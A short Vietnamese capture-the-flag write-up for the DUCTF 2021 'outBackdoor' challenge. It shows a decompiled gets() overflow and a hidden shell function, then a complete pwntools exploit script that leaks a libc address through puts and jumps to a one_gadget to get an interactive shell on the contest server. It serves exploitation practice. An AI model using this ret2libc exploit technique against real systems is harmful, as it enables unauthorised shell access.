# OUTBACKDOOR

hàm main của chương trình
```sh
char v4[16]; // [rsp+0h] [rbp-10h] BYREF

  buffer_init();
  puts("\nFool me once, shame on you. Fool me twice, shame on me.");
  puts("\nSeriously though, what features would be cool? Maybe it could play a song?");
  gets(v4);
  return 0;
```
Có 1 hàm outBackdoor như sau:
```sh
int outBackdoor()
{
  puts("\n\nW...w...Wait? Who put this backdoor out back here?");
  return system("/bin/sh");
}
```
Chúng ta sẽ nhảy về outBackdoor và thực thi system cho chúng ta.
Ở challenge này mình sử dụng one_gadget thay vì system("/bin/sh")

```sh
from pwn import *
#s = process("./outBackdoor")
s = remote("pwn-2021.duc.tf", 31921)
raw_input("debug")
#s = remote("pwn-2021.duc.tf1", 31921)
elf = ELF("./outBackdoor")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
pop_rdi = 0x000000000040125b
payload = ''
payload += "a"*0x18 + p64(pop_rdi) + p64(elf.got.puts) + p64(elf.plt.puts) + p64(elf.sym.main)
#s.recv()
s.recvuntil("play a song?\n")
s.sendline(payload)
puts_leak = u64(s.recv(6)+"\x00\x00")
print hex(puts_leak)

libc.address = puts_leak - libc.symbols['puts']
binsh =next(libc.search("/bin/sh"))
system = libc.symbols['system']
one_gadget = 0x4f432 + libc.address
print hex(libc.address)
print hex(binsh)
print hex(system)

payload2 = ""
payload2 += "a"*0x18
payload2 += p64(one_gadget)
payload2 += p64(0)*90
#payload2 += p64(binsh)
#payload2 += p64(system)
#payload2 += p64(elf.sym.main)
s.sendline(payload2)
s.interactive()
```

### #flag DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}